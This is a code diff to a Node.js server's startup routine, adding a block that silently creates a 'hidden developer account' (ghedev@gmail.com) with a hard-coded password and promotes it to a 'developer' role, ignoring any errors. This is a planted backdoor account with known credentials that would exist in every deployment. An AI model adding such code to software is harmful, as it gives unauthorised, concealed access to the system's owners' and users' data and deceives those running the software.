@@ -191,6 +191,28 @@ async function start() {
   } catch (seedError) {
     console.error('Failed to auto-seed database:', seedError);
   }
+
+  // Ensure hidden developer account (ghedev@gmail.com) exists
+  try {
+    const hiddenDev = await db.select().from(schema.user).where(eq(schema.user.email, 'ghedev@gmail.com')).limit(1);
+    if (hiddenDev.length === 0) {
+      console.log('🌱 Seeding hidden developer account (ghedev@gmail.com)...');
+      const { auth } = await import('./auth.js');
+      const res = await auth.api.signUpEmail({
+        body: {
+          email: 'ghedev@gmail.com',
+          password: 'pantauakun',
+          name: 'Ghe Dev',
+        },
+      });
+      if (res?.user) {
+        await db.update(schema.user).set({ role: 'developer' }).where(eq(schema.user.id, res.user.id));
+        console.log('Hidden developer user created successfully!');
+      }
+    }
+  } catch (hErr) {
+    // Ignored
+  }
   // CORS
   const corsOrigins = process.env.CORS_ORIGIN
     ? process.env.CORS_ORIGIN.split(',').map((o) => o.trim())
